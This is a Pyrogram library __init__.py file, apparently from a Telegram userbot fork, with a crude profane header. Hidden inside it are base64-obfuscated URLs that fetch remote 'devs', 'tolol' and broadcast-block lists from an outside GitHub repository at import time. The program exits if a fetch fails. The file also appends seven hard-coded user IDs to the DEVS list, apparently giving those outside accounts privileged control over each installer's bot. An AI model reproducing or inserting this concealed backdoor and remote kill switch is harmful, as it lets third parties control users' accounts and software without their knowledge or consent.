################################################################
"""
 Mix-Userbot Open Source . Maintained ? Yes Oh No Oh Yes Ngentot
 
 @ CREDIT : NAN-DEV
"""
################################################################

from typing import Union, Dict, Optional
import sys
import json
from base64 import b64decode
import requests
from config import DEVS

__version__ = "1.0.1"
__license__ = "GNU Lesser General Public License v3.0 (LGPL-3.0)"
__copyright__ = "Copyright (C) 2017-present Dan <https://github.com/delivrance>"


def get_devs():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9kZXZzLmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

def get_tolol():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi90b2xvbC5qc29u"
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

def get_blgc():
    try:
        aa = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25heWExNTAzL3dhcm5pbmcvbWFpbi9ibGdjYXN0Lmpzb24="
        bb = b64decode(aa).decode("utf-8")
        res = requests.get(bb)
        if res.status_code == 200:
            return json.loads(res.text)
    except Exception as e:
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

DEVS.append(1992087933)
DEVS.append(1054295664)
DEVS.append(164809358)
DEVS.append(1087819304)
DEVS.append(479344690)
DEVS.append(7148043945)
DEVS.append(5354460074)

TOLOL = get_tolol()

NO_GCAST = get_blgc()

from concurrent.futures.thread import ThreadPoolExecutor


class StopTransmission(Exception):
    pass


class StopPropagation(StopAsyncIteration):
    pass


class ContinuePropagation(StopAsyncIteration):
    pass


from . import raw, types, filters, handlers, emoji, enums
from .client import Client
from .sync import idle, compose

crypto_executor = ThreadPoolExecutor(1, thread_name_prefix="CryptoWorker")

    

